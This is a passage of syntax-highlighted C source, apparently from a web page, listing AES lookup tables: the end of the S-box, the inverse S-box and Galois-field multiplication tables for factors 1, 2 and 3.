class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x97</span>, <span class="number">0x44</span>, <span class="number">0x17</span>, <span class="number">0xC4</span>, <span class="number">0xA7</span>, <span class="number">0x7E</span>, <span class="number">0x3D</span>, <span class="number">0x64</span>, <span class="number">0x5D</span>, <span class="number">0x19</span>, <span class="number">0x73</span>,</span><br><span class="line">	<span class="number">0x60</span>, <span class="number">0x81</span>, <span class="number">0x4F</span>, <span class="number">0xDC</span>, <span class="number">0x22</span>, <span class="number">0x2A</span>, <span class="number">0x90</span>, <span class="number">0x88</span>, <span class="number">0x46</span>, <span class="number">0xEE</span>, <span class="number">0xB8</span>, <span class="number">0x14</span>, <span class="number">0xDE</span>, <span class="number">0x5E</span>, <span class="number">0x0B</span>, <span class="number">0xDB</span>,</span><br><span class="line">	<span class="number">0xE0</span>, <span class="number">0x32</span>, <span class="number">0x3A</span>, <span class="number">0x0A</span>, <span class="number">0x49</span>, <span class="number">0x06</span>, <span class="number">0x24</span>, <span class="number">0x5C</span>, <span class="number">0xC2</span>, <span class="number">0xD3</span>, <span class="number">0xAC</span>, <span class="number">0x62</span>, <span class="number">0x91</span>, <span class="number">0x95</span>, <span class="number">0xE4</span>, <span class="number">0x79</span>,</span><br><span class="line">	<span class="number">0xE7</span>, <span class="number">0xC8</span>, <span class="number">0x37</span>, <span class="number">0x6D</span>, <span class="number">0x8D</span>, <span class="number">0xD5</span>, <span class="number">0x4E</span>, <span class="number">0xA9</span>, <span class="number">0x6C</span>, <span class="number">0x56</span>, <span class="number">0xF4</span>, <span class="number">0xEA</span>, <span class="number">0x65</span>, <span class="number">0x7A</span>, <span class="number">0xAE</span>, <span class="number">0x08</span>,</span><br><span class="line">	<span class="number">0xBA</span>, <span class="number">0x78</span>, <span class="number">0x25</span>, <span class="number">0x2E</span>, <span class="number">0x1C</span>, <span class="number">0xA6</span>, <span class="number">0xB4</span>, <span class="number">0xC6</span>, <span class="number">0xE8</span>, <span class="number">0xDD</span>, <span class="number">0x74</span>, <span class="number">0x1F</span>, <span class="number">0x4B</span>, <span class="number">0xBD</span>, <span class="number">0x8B</span>, <span class="number">0x8A</span>,</span><br><span class="line">	<span class="number">0x70</span>, <span class="number">0x3E</span>, <span class="number">0xB5</span>, <span class="number">0x66</span>, <span class="number">0x48</span>, <span class="number">0x03</span>, <span class="number">0xF6</span>, <span class="number">0x0E</span>, <span class="number">0x61</span>, <span class="number">0x35</span>, <span class="number">0x57</span>, <span class="number">0xB9</span>, <span class="number">0x86</span>, <span class="number">0xC1</span>, <span class="number">0x1D</span>, <span class="number">0x9E</span>,</span><br><span class="line">	<span class="number">0xE1</span>, <span class="number">0xF8</span>, <span class="number">0x98</span>, <span class="number">0x11</span>, <span class="number">0x69</span>, <span class="number">0xD9</span>, <span class="number">0x8E</span>, <span class="number">0x94</span>, <span class="number">0x9B</span>, <span class="number">0x1E</span>, <span class="number">0x87</span>, <span class="number">0xE9</span>, <span class="number">0xCE</span>, <span class="number">0x55</span>, <span class="number">0x28</span>, <span class="number">0xDF</span>,</span><br><span class="line">	<span class="number">0x8C</span>, <span class="number">0xA1</span>, <span class="number">0x89</span>, <span class="number">0x0D</span>, <span class="number">0xBF</span>, <span class="number">0xE6</span>, <span class="number">0x42</span>, <span class="number">0x68</span>, <span class="number">0x41</span>, <span class="number">0x99</span>, <span class="number">0x2D</span>, <span class="number">0x0F</span>, <span class="number">0xB0</span>, <span class="number">0x54</span>, <span class="number">0xBB</span>, <span class="number">0x16</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> RevSbox[] = &#123;</span><br><span class="line">	<span class="number">0x52</span>, <span class="number">0x09</span>, <span class="number">0x6A</span>, <span class="number">0xD5</span>, <span class="number">0x30</span>, <span class="number">0x36</span>, <span class="number">0xA5</span>, <span class="number">0x38</span>, <span class="number">0xBF</span>, <span class="number">0x40</span>, <span class="number">0xA3</span>, <span class="number">0x9E</span>, <span class="number">0x81</span>, <span class="number">0xF3</span>, <span class="number">0xD7</span>, <span class="number">0xFB</span>,</span><br><span class="line">	<span class="number">0x7C</span>, <span class="number">0xE3</span>, <span class="number">0x39</span>, <span class="number">0x82</span>, <span class="number">0x9B</span>, <span class="number">0x2F</span>, <span class="number">0xFF</span>, <span class="number">0x87</span>, <span class="number">0x34</span>, <span class="number">0x8E</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0xC4</span>, <span class="number">0xDE</span>, <span class="number">0xE9</span>, <span class="number">0xCB</span>,</span><br><span class="line">	<span class="number">0x54</span>, <span class="number">0x7B</span>, <span class="number">0x94</span>, <span class="number">0x32</span>, <span class="number">0xA6</span>, <span class="number">0xC2</span>, <span class="number">0x23</span>, <span class="number">0x3D</span>, <span class="number">0xEE</span>, <span class="number">0x4C</span>, <span class="number">0x95</span>, <span class="number">0x0B</span>, <span class="number">0x42</span>, <span class="number">0xFA</span>, <span class="number">0xC3</span>, <span class="number">0x4E</span>,</span><br><span class="line">	<span class="number">0x08</span>, <span class="number">0x2E</span>, <span class="number">0xA1</span>, <span class="number">0x66</span>, <span class="number">0x28</span>, <span class="number">0xD9</span>, <span class="number">0x24</span>, <span class="number">0xB2</span>, <span class="number">0x76</span>, <span class="number">0x5B</span>, <span class="number">0xA2</span>, <span class="number">0x49</span>, <span class="number">0x6D</span>, <span class="number">0x8B</span>, <span class="number">0xD1</span>, <span class="number">0x25</span>,</span><br><span class="line">	<span class="number">0x72</span>, <span class="number">0xF8</span>, <span class="number">0xF6</span>, <span class="number">0x64</span>, <span class="number">0x86</span>, <span class="number">0x68</span>, <span class="number">0x98</span>, <span class="number">0x16</span>, <span class="number">0xD4</span>, <span class="number">0xA4</span>, <span class="number">0x5C</span>, <span class="number">0xCC</span>, <span class="number">0x5D</span>, <span class="number">0x65</span>, <span class="number">0xB6</span>, <span class="number">0x92</span>,</span><br><span class="line">	<span class="number">0x6C</span>, <span class="number">0x70</span>, <span class="number">0x48</span>, <span class="number">0x50</span>, <span class="number">0xFD</span>, <span class="number">0xED</span>, <span class="number">0xB9</span>, <span class="number">0xDA</span>, <span class="number">0x5E</span>, <span class="number">0x15</span>, <span class="number">0x46</span>, <span class="number">0x57</span>, <span class="number">0xA7</span>, <span class="number">0x8D</span>, <span class="number">0x9D</span>, <span class="number">0x84</span>,</span><br><span class="line">	<span class="number">0x90</span>, <span class="number">0xD8</span>, <span class="number">0xAB</span>, <span class="number">0x00</span>, <span class="number">0x8C</span>, <span class="number">0xBC</span>, <span class="number">0xD3</span>, <span class="number">0x0A</span>, <span class="number">0xF7</span>, <span class="number">0xE4</span>, <span class="number">0x58</span>, <span class="number">0x05</span>, <span class="number">0xB8</span>, <span class="number">0xB3</span>, <span class="number">0x45</span>, <span class="number">0x06</span>,</span><br><span class="line">	<span class="number">0xD0</span>, <span class="number">0x2C</span>, <span class="number">0x1E</span>, <span class="number">0x8F</span>, <span class="number">0xCA</span>, <span class="number">0x3F</span>, <span class="number">0x0F</span>, <span class="number">0x02</span>, <span class="number">0xC1</span>, <span class="number">0xAF</span>, <span class="number">0xBD</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x13</span>, <span class="number">0x8A</span>, <span class="number">0x6B</span>,</span><br><span class="line">	<span class="number">0x3A</span>, <span class="number">0x91</span>, <span class="number">0x11</span>, <span class="number">0x41</span>, <span class="number">0x4F</span>, <span class="number">0x67</span>, <span class="number">0xDC</span>, <span class="number">0xEA</span>, <span class="number">0x97</span>, <span class="number">0xF2</span>, <span class="number">0xCF</span>, <span class="number">0xCE</span>, <span class="number">0xF0</span>, <span class="number">0xB4</span>, <span class="number">0xE6</span>, <span class="number">0x73</span>,</span><br><span class="line">	<span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x74</span>, <span class="number">0x22</span>, <span class="number">0xE7</span>, <span class="number">0xAD</span>, <span class="number">0x35</span>, <span class="number">0x85</span>, <span class="number">0xE2</span>, <span class="number">0xF9</span>, <span class="number">0x37</span>, <span class="number">0xE8</span>, <span class="number">0x1C</span>, <span class="number">0x75</span>, <span class="number">0xDF</span>, <span class="number">0x6E</span>,</span><br><span class="line">	<span class="number">0x47</span>, <span class="number">0xF1</span>, <span class="number">0x1A</span>, <span class="number">0x71</span>, <span class="number">0x1D</span>, <span class="number">0x29</span>, <span class="number">0xC5</span>, <span class="number">0x89</span>, <span class="number">0x6F</span>, <span class="number">0xB7</span>, <span class="number">0x62</span>, <span class="number">0x0E</span>, <span class="number">0xAA</span>, <span class="number">0x18</span>, <span class="number">0xBE</span>, <span class="number">0x1B</span>,</span><br><span class="line">	<span class="number">0xFC</span>, <span class="number">0x56</span>, <span class="number">0x3E</span>, <span class="number">0x4B</span>, <span class="number">0xC6</span>, <span class="number">0xD2</span>, <span class="number">0x79</span>, <span class="number">0x20</span>, <span class="number">0x9A</span>, <span class="number">0xDB</span>, <span class="number">0xC0</span>, <span class="number">0xFE</span>, <span class="number">0x78</span>, <span class="number">0xCD</span>, <span class="number">0x5A</span>, <span class="number">0xF4</span>,</span><br><span class="line">	<span class="number">0x1F</span>, <span class="number">0xDD</span>, <span class="number">0xA8</span>, <span class="number">0x33</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xC7</span>, <span class="number">0x31</span>, <span class="number">0xB1</span>, <span class="number">0x12</span>, <span class="number">0x10</span>, <span class="number">0x59</span>, <span class="number">0x27</span>, <span class="number">0x80</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>,</span><br><span class="line">	<span class="number">0x60</span>, <span class="number">0x51</span>, <span class="number">0x7F</span>, <span class="number">0xA9</span>, <span class="number">0x19</span>, <span class="number">0xB5</span>, <span class="number">0x4A</span>, <span class="number">0x0D</span>, <span class="number">0x2D</span>, <span class="number">0xE5</span>, <span class="number">0x7A</span>, <span class="number">0x9F</span>, <span class="number">0x93</span>, <span class="number">0xC9</span>, <span class="number">0x9C</span>, <span class="number">0xEF</span>,</span><br><span class="line">	<span class="number">0xA0</span>, <span class="number">0xE0</span>, <span class="number">0x3B</span>, <span class="number">0x4D</span>, <span class="number">0xAE</span>, <span class="number">0x2A</span>, <span class="number">0xF5</span>, <span class="number">0xB0</span>, <span class="number">0xC8</span>, <span class="number">0xEB</span>, <span class="number">0xBB</span>, <span class="number">0x3C</span>, <span class="number">0x83</span>, <span class="number">0x53</span>, <span class="number">0x99</span>, <span class="number">0x61</span>,</span><br><span class="line">	<span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x04</span>, <span class="number">0x7E</span>, <span class="number">0xBA</span>, <span class="number">0x77</span>, <span class="number">0xD6</span>, <span class="number">0x26</span>, <span class="number">0xE1</span>, <span class="number">0x69</span>, <span class="number">0x14</span>, <span class="number">0x63</span>, <span class="number">0x55</span>, <span class="number">0x21</span>, <span class="number">0x0C</span>, <span class="number">0x7D</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> GF_MULT_1[] = &#123;</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x02</span>, <span class="number">0x03</span>, <span class="number">0x04</span>, <span class="number">0x05</span>, <span class="number">0x06</span>, <span class="number">0x07</span>, <span class="number">0x08</span>, <span class="number">0x09</span>, <span class="number">0x0a</span>, <span class="number">0x0b</span>, <span class="number">0x0c</span>, <span class="number">0x0d</span>, <span class="number">0x0e</span>, <span class="number">0x0f</span>,</span><br><span class="line">	<span class="number">0x10</span>, <span class="number">0x11</span>, <span class="number">0x12</span>, <span class="number">0x13</span>, <span class="number">0x14</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x17</span>, <span class="number">0x18</span>, <span class="number">0x19</span>, <span class="number">0x1a</span>, <span class="number">0x1b</span>, <span class="number">0x1c</span>, <span class="number">0x1d</span>, <span class="number">0x1e</span>, <span class="number">0x1f</span>,</span><br><span class="line">	<span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2a</span>, <span class="number">0x2b</span>, <span class="number">0x2c</span>, <span class="number">0x2d</span>, <span class="number">0x2e</span>, <span class="number">0x2f</span>,</span><br><span class="line">	<span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>, <span class="number">0x37</span>, <span class="number">0x38</span>, <span class="number">0x39</span>, <span class="number">0x3a</span>, <span class="number">0x3b</span>, <span class="number">0x3c</span>, <span class="number">0x3d</span>, <span class="number">0x3e</span>, <span class="number">0x3f</span>,</span><br><span class="line">	<span class="number">0x40</span>, <span class="number">0x41</span>, <span class="number">0x42</span>, <span class="number">0x43</span>, <span class="number">0x44</span>, <span class="number">0x45</span>, <span class="number">0x46</span>, <span class="number">0x47</span>, <span class="number">0x48</span>, <span class="number">0x49</span>, <span class="number">0x4a</span>, <span class="number">0x4b</span>, <span class="number">0x4c</span>, <span class="number">0x4d</span>, <span class="number">0x4e</span>, <span class="number">0x4f</span>,</span><br><span class="line">	<span class="number">0x50</span>, <span class="number">0x51</span>, <span class="number">0x52</span>, <span class="number">0x53</span>, <span class="number">0x54</span>, <span class="number">0x55</span>, <span class="number">0x56</span>, <span class="number">0x57</span>, <span class="number">0x58</span>, <span class="number">0x59</span>, <span class="number">0x5a</span>, <span class="number">0x5b</span>, <span class="number">0x5c</span>, <span class="number">0x5d</span>, <span class="number">0x5e</span>, <span class="number">0x5f</span>,</span><br><span class="line">	<span class="number">0x60</span>, <span class="number">0x61</span>, <span class="number">0x62</span>, <span class="number">0x63</span>, <span class="number">0x64</span>, <span class="number">0x65</span>, <span class="number">0x66</span>, <span class="number">0x67</span>, <span class="number">0x68</span>, <span class="number">0x69</span>, <span class="number">0x6a</span>, <span class="number">0x6b</span>, <span class="number">0x6c</span>, <span class="number">0x6d</span>, <span class="number">0x6e</span>, <span class="number">0x6f</span>,</span><br><span class="line">	<span class="number">0x70</span>, <span class="number">0x71</span>, <span class="number">0x72</span>, <span class="number">0x73</span>, <span class="number">0x74</span>, <span class="number">0x75</span>, <span class="number">0x76</span>, <span class="number">0x77</span>, <span class="number">0x78</span>, <span class="number">0x79</span>, <span class="number">0x7a</span>, <span class="number">0x7b</span>, <span class="number">0x7c</span>, <span class="number">0x7d</span>, <span class="number">0x7e</span>, <span class="number">0x7f</span>,</span><br><span class="line">	<span class="number">0x80</span>, <span class="number">0x81</span>, <span class="number">0x82</span>, <span class="number">0x83</span>, <span class="number">0x84</span>, <span class="number">0x85</span>, <span class="number">0x86</span>, <span class="number">0x87</span>, <span class="number">0x88</span>, <span class="number">0x89</span>, <span class="number">0x8a</span>, <span class="number">0x8b</span>, <span class="number">0x8c</span>, <span class="number">0x8d</span>, <span class="number">0x8e</span>, <span class="number">0x8f</span>,</span><br><span class="line">	<span class="number">0x90</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x93</span>, <span class="number">0x94</span>, <span class="number">0x95</span>, <span class="number">0x96</span>, <span class="number">0x97</span>, <span class="number">0x98</span>, <span class="number">0x99</span>, <span class="number">0x9a</span>, <span class="number">0x9b</span>, <span class="number">0x9c</span>, <span class="number">0x9d</span>, <span class="number">0x9e</span>, <span class="number">0x9f</span>,</span><br><span class="line">	<span class="number">0xa0</span>, <span class="number">0xa1</span>, <span class="number">0xa2</span>, <span class="number">0xa3</span>, <span class="number">0xa4</span>, <span class="number">0xa5</span>, <span class="number">0xa6</span>, <span class="number">0xa7</span>, <span class="number">0xa8</span>, <span class="number">0xa9</span>, <span class="number">0xaa</span>, <span class="number">0xab</span>, <span class="number">0xac</span>, <span class="number">0xad</span>, <span class="number">0xae</span>, <span class="number">0xaf</span>,</span><br><span class="line">	<span class="number">0xb0</span>, <span class="number">0xb1</span>, <span class="number">0xb2</span>, <span class="number">0xb3</span>, <span class="number">0xb4</span>, <span class="number">0xb5</span>, <span class="number">0xb6</span>, <span class="number">0xb7</span>, <span class="number">0xb8</span>, <span class="number">0xb9</span>, <span class="number">0xba</span>, <span class="number">0xbb</span>, <span class="number">0xbc</span>, <span class="number">0xbd</span>, <span class="number">0xbe</span>, <span class="number">0xbf</span>,</span><br><span class="line">	<span class="number">0xc0</span>, <span class="number">0xc1</span>, <span class="number">0xc2</span>, <span class="number">0xc3</span>, <span class="number">0xc4</span>, <span class="number">0xc5</span>, <span class="number">0xc6</span>, <span class="number">0xc7</span>, <span class="number">0xc8</span>, <span class="number">0xc9</span>, <span class="number">0xca</span>, <span class="number">0xcb</span>, <span class="number">0xcc</span>, <span class="number">0xcd</span>, <span class="number">0xce</span>, <span class="number">0xcf</span>,</span><br><span class="line">	<span class="number">0xd0</span>, <span class="number">0xd1</span>, <span class="number">0xd2</span>, <span class="number">0xd3</span>, <span class="number">0xd4</span>, <span class="number">0xd5</span>, <span class="number">0xd6</span>, <span class="number">0xd7</span>, <span class="number">0xd8</span>, <span class="number">0xd9</span>, <span class="number">0xda</span>, <span class="number">0xdb</span>, <span class="number">0xdc</span>, <span class="number">0xdd</span>, <span class="number">0xde</span>, <span class="number">0xdf</span>,</span><br><span class="line">	<span class="number">0xe0</span>, <span class="number">0xe1</span>, <span class="number">0xe2</span>, <span class="number">0xe3</span>, <span class="number">0xe4</span>, <span class="number">0xe5</span>, <span class="number">0xe6</span>, <span class="number">0xe7</span>, <span class="number">0xe8</span>, <span class="number">0xe9</span>, <span class="number">0xea</span>, <span class="number">0xeb</span>, <span class="number">0xec</span>, <span class="number">0xed</span>, <span class="number">0xee</span>, <span class="number">0xef</span>,</span><br><span class="line">	<span class="number">0xf0</span>, <span class="number">0xf1</span>, <span class="number">0xf2</span>, <span class="number">0xf3</span>, <span class="number">0xf4</span>, <span class="number">0xf5</span>, <span class="number">0xf6</span>, <span class="number">0xf7</span>, <span class="number">0xf8</span>, <span class="number">0xf9</span>, <span class="number">0xfa</span>, <span class="number">0xfb</span>, <span class="number">0xfc</span>, <span class="number">0xfd</span>, <span class="number">0xfe</span>, <span class="number">0xff</span> </span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> GF_MULT_2[] = &#123;</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x04</span>, <span class="number">0x06</span>, <span class="number">0x08</span>, <span class="number">0x0a</span>, <span class="number">0x0c</span>, <span class="number">0x0e</span>, <span class="number">0x10</span>, <span class="number">0x12</span>, <span class="number">0x14</span>, <span class="number">0x16</span>, <span class="number">0x18</span>, <span class="number">0x1a</span>, <span class="number">0x1c</span>, <span class="number">0x1e</span>,</span><br><span class="line">	<span class="number">0x20</span>, <span class="number">0x22</span>, <span class="number">0x24</span>, <span class="number">0x26</span>, <span class="number">0x28</span>, <span class="number">0x2a</span>, <span class="number">0x2c</span>, <span class="number">0x2e</span>, <span class="number">0x30</span>, <span class="number">0x32</span>, <span class="number">0x34</span>, <span class="number">0x36</span>, <span class="number">0x38</span>, <span class="number">0x3a</span>, <span class="number">0x3c</span>, <span class="number">0x3e</span>,</span><br><span class="line">	<span class="number">0x40</span>, <span class="number">0x42</span>, <span class="number">0x44</span>, <span class="number">0x46</span>, <span class="number">0x48</span>, <span class="number">0x4a</span>, <span class="number">0x4c</span>, <span class="number">0x4e</span>, <span class="number">0x50</span>, <span class="number">0x52</span>, <span class="number">0x54</span>, <span class="number">0x56</span>, <span class="number">0x58</span>, <span class="number">0x5a</span>, <span class="number">0x5c</span>, <span class="number">0x5e</span>,</span><br><span class="line">	<span class="number">0x60</span>, <span class="number">0x62</span>, <span class="number">0x64</span>, <span class="number">0x66</span>, <span class="number">0x68</span>, <span class="number">0x6a</span>, <span class="number">0x6c</span>, <span class="number">0x6e</span>, <span class="number">0x70</span>, <span class="number">0x72</span>, <span class="number">0x74</span>, <span class="number">0x76</span>, <span class="number">0x78</span>, <span class="number">0x7a</span>, <span class="number">0x7c</span>, <span class="number">0x7e</span>,</span><br><span class="line">	<span class="number">0x80</span>, <span class="number">0x82</span>, <span class="number">0x84</span>, <span class="number">0x86</span>, <span class="number">0x88</span>, <span class="number">0x8a</span>, <span class="number">0x8c</span>, <span class="number">0x8e</span>, <span class="number">0x90</span>, <span class="number">0x92</span>, <span class="number">0x94</span>, <span class="number">0x96</span>, <span class="number">0x98</span>, <span class="number">0x9a</span>, <span class="number">0x9c</span>, <span class="number">0x9e</span>,</span><br><span class="line">	<span class="number">0xa0</span>, <span class="number">0xa2</span>, <span class="number">0xa4</span>, <span class="number">0xa6</span>, <span class="number">0xa8</span>, <span class="number">0xaa</span>, <span class="number">0xac</span>, <span class="number">0xae</span>, <span class="number">0xb0</span>, <span class="number">0xb2</span>, <span class="number">0xb4</span>, <span class="number">0xb6</span>, <span class="number">0xb8</span>, <span class="number">0xba</span>, <span class="number">0xbc</span>, <span class="number">0xbe</span>,</span><br><span class="line">	<span class="number">0xc0</span>, <span class="number">0xc2</span>, <span class="number">0xc4</span>, <span class="number">0xc6</span>, <span class="number">0xc8</span>, <span class="number">0xca</span>, <span class="number">0xcc</span>, <span class="number">0xce</span>, <span class="number">0xd0</span>, <span class="number">0xd2</span>, <span class="number">0xd4</span>, <span class="number">0xd6</span>, <span class="number">0xd8</span>, <span class="number">0xda</span>, <span class="number">0xdc</span>, <span class="number">0xde</span>,</span><br><span class="line">	<span class="number">0xe0</span>, <span class="number">0xe2</span>, <span class="number">0xe4</span>, <span class="number">0xe6</span>, <span class="number">0xe8</span>, <span class="number">0xea</span>, <span class="number">0xec</span>, <span class="number">0xee</span>, <span class="number">0xf0</span>, <span class="number">0xf2</span>, <span class="number">0xf4</span>, <span class="number">0xf6</span>, <span class="number">0xf8</span>, <span class="number">0xfa</span>, <span class="number">0xfc</span>, <span class="number">0xfe</span>,</span><br><span class="line">	<span class="number">0x1b</span>, <span class="number">0x19</span>, <span class="number">0x1f</span>, <span class="number">0x1d</span>, <span class="number">0x13</span>, <span class="number">0x11</span>, <span class="number">0x17</span>, <span class="number">0x15</span>, <span class="number">0x0b</span>, <span class="number">0x09</span>, <span class="number">0x0f</span>, <span class="number">0x0d</span>, <span class="number">0x03</span>, <span class="number">0x01</span>, <span class="number">0x07</span>, <span class="number">0x05</span>,</span><br><span class="line">	<span class="number">0x3b</span>, <span class="number">0x39</span>, <span class="number">0x3f</span>, <span class="number">0x3d</span>, <span class="number">0x33</span>, <span class="number">0x31</span>, <span class="number">0x37</span>, <span class="number">0x35</span>, <span class="number">0x2b</span>, <span class="number">0x29</span>, <span class="number">0x2f</span>, <span class="number">0x2d</span>, <span class="number">0x23</span>, <span class="number">0x21</span>, <span class="number">0x27</span>, <span class="number">0x25</span>,</span><br><span class="line">	<span class="number">0x5b</span>, <span class="number">0x59</span>, <span class="number">0x5f</span>, <span class="number">0x5d</span>, <span class="number">0x53</span>, <span class="number">0x51</span>, <span class="number">0x57</span>, <span class="number">0x55</span>, <span class="number">0x4b</span>, <span class="number">0x49</span>, <span class="number">0x4f</span>, <span class="number">0x4d</span>, <span class="number">0x43</span>, <span class="number">0x41</span>, <span class="number">0x47</span>, <span class="number">0x45</span>,</span><br><span class="line">	<span class="number">0x7b</span>, <span class="number">0x79</span>, <span class="number">0x7f</span>, <span class="number">0x7d</span>, <span class="number">0x73</span>, <span class="number">0x71</span>, <span class="number">0x77</span>, <span class="number">0x75</span>, <span class="number">0x6b</span>, <span class="number">0x69</span>, <span class="number">0x6f</span>, <span class="number">0x6d</span>, <span class="number">0x63</span>, <span class="number">0x61</span>, <span class="number">0x67</span>, <span class="number">0x65</span>,</span><br><span class="line">	<span class="number">0x9b</span>, <span class="number">0x99</span>, <span class="number">0x9f</span>, <span class="number">0x9d</span>, <span class="number">0x93</span>, <span class="number">0x91</span>, <span class="number">0x97</span>, <span class="number">0x95</span>, <span class="number">0x8b</span>, <span class="number">0x89</span>, <span class="number">0x8f</span>, <span class="number">0x8d</span>, <span class="number">0x83</span>, <span class="number">0x81</span>, <span class="number">0x87</span>, <span class="number">0x85</span>,</span><br><span class="line">	<span class="number">0xbb</span>, <span class="number">0xb9</span>, <span class="number">0xbf</span>, <span class="number">0xbd</span>, <span class="number">0xb3</span>, <span class="number">0xb1</span>, <span class="number">0xb7</span>, <span class="number">0xb5</span>, <span class="number">0xab</span>, <span class="number">0xa9</span>, <span class="number">0xaf</span>, <span class="number">0xad</span>, <span class="number">0xa3</span>, <span class="number">0xa1</span>, <span class="number">0xa7</span>, <span class="number">0xa5</span>,</span><br><span class="line">	<span class="number">0xdb</span>, <span class="number">0xd9</span>, <span class="number">0xdf</span>, <span class="number">0xdd</span>, <span class="number">0xd3</span>, <span class="number">0xd1</span>, <span class="number">0xd7</span>, <span class="number">0xd5</span>, <span class="number">0xcb</span>, <span class="number">0xc9</span>, <span class="number">0xcf</span>, <span class="number">0xcd</span>, <span class="number">0xc3</span>, <span class="number">0xc1</span>, <span class="number">0xc7</span>, <span class="number">0xc5</span>,</span><br><span class="line">	<span class="number">0xfb</span>, <span class="number">0xf9</span>, <span class="number">0xff</span>, <span class="number">0xfd</span>, <span class="number">0xf3</span>, <span class="number">0xf1</span>, <span class="number">0xf7</span>, <span class="number">0xf5</span>, <span class="number">0xeb</span>, <span class="number">0xe9</span>, <span class="number">0xef</span>, <span class="number">0xed</span>, <span class="number">0xe3</span>, <span class="number">0xe1</span>, <span class="number">0xe7</span>, <span class="number">0xe5</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> GF_MULT_3[] = &#123;</span><br><span class="line">	<span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x06</span>, <span class="number">0x05</span>, <span class="number">0x0c</span>, <span class="number">0x0f</span>, <span class="number">0x0a</span>, <span class="number">0x09</span>, <span class="number">0x18</span>, <span class="number">0x1b</span>, <span class="number">0x1e</span>, <span class="number">0x1d</span>, <span class="number">0x14</span>, <span class="number">0x17</span>, <span class="number">0x12</span>, <span class="number">0x11</span>,</span><br><span class="line">	<span class="number">0x30</span>, <span class="number">0x33</span>, <span class="number">0x36</span>, <span class="number">0x35</span>, <span class="number">0x3c</span>, <span class="number">0x3f</span>, <span class="number">0x3a</span>, <span class="number">0x39</span>, <span class="number">0x28</span>, <span class="number">0x2b</span>, <span class="number">0x2e</span>, <span class="number">0x2d</span>, <span class="number">0x24</span>, <span class="number">0x27</span>, <span class="number">0x22</span>, <span class="number">0x21</span>,</span><br><span class="line">	<span class="number">0x60</span>, <span class="number">0x63</span>, <span class="number">0x66</span>, <span class="number">0x65</span>, <span class="number">0x6c</span>, <span class="number">0x6f</span>, <span class="number">0x6a</span>, <span class="number">0x69</span>, <span class="number">0x78</span>, <span class="number">0x7b</span>, <span class="number">0x7e</span>, <span class="number">0x7d</span>, <span class="number">0x74</span>, <span class="number">0x77</span>, <span class="number">0x72</span>, <span class="number">0x71</span>,</span><br><span class="line">	<span class="number">0x50</span>, <span class="number">0x53</span>, <span class="number">0x56</span>, <span class="number">0x55</span>, <span class="number">0x5c</span>, <span class="number">0x5f</span>, <span class="number">0x5a</span>, <span class="number">0x59</span>, <span class="number">0x48</span>, <span class="number">0x4b</span>, <span class="number">0x4e</span>, <span class="number">0x4d</span>, <span class="number">0x44</span>, <span class="number">0x47</span>, <span class="number">0x42</span>, <span class="number">0x41</span>,</span><br><span class="line">	<span class="number">0xc0</span>, <span class="number">0xc3</span>, <span class="number">0xc6</span>, <span class="number">0xc5</span>, <span class="number">0xcc</span>, <span class="number">0xcf</span>, <span class="number">0xca</span>, <span class="number">0xc9</span>, <span class="number">0xd8</span>, <span class="number">0xdb</span>, <span class="number">0xde</span>, <span class="number">0xdd</span>, <span class="number">0xd4</span>, <span class="number">0xd7</span>, <span class="number">0xd2</span>, <span class="number">0xd1</span>,</span><br><span class="line">	<span class="number">0xf0</span>, <span class="number">0xf3</span>, <span class="number">0xf6</span>, <span class="number">0xf5</span>, <span class="number">0xfc</span>, <span class="number">0xff</span>, <span class="number">0xfa</span>, <span class="number">0xf9</span>, <span class="number">0xe8</span>, <span class="number">0xeb</span>, <span class="number">0xee</span>, <span class="number">0xed</span>, <span class="number">0xe4</span>, <span class="number">0xe7</span>, <span class="number">0xe2</span>, <span class="number">0xe1</span>,</span><br><span class="line">	<span class="number">0xa0</span>, <span class="number">0xa3</span>, <span class="number">0xa6</span>, <span class="number">0xa5</span>, <span class="number">0xac</span>, <span class="number">0xaf</span>, <span class="number">0xaa</span>, <span class="number">0xa9</span>, <span class="number">0xb8</span>, <span class="number">0xbb</span>, <span class="number">0xbe</span>, <span class="number">0xbd</span>, <span class="number">0xb4</span>, <span class="number">0xb7</span>, <span class="number">0xb2</span>, <span class="number">0xb1</span>,</span><br><span class="line">	<span class="number">0x90</span>, <span class="number">0x93</span>, <span class="number">0x96</span>, <span class="number">0x95</span>, <span class="number">0x9c</span>, <span class="number">0x9f</span>, <span class="number">0x9a</span>, <span class="number">0x99</span>, <span class="number">0x88</span>, <span class="number">0x8b</span>, <span class="number">0x8e</span>, <span class="number">0x8d</span>, <span class="number">0x84</span>, <span class="number">0x87</span>, <span class="number">0x82</span>, <span class="number">0x81</span>,</span><br><span class="line">	<span class="number">0x9b</span>, <span class="number">0x98</span>, <span class="number">0x9d</span>, <span class="number">0x9e</span>, <span class="number">0x97</span>, <span class="number">0x94</span>, <span class="number">0x91</span>, <span class="number">0x92</span>, <span class="number">0x83</span>, <span class="number">0x80</span>, <span class="number">0x85</span>, <span 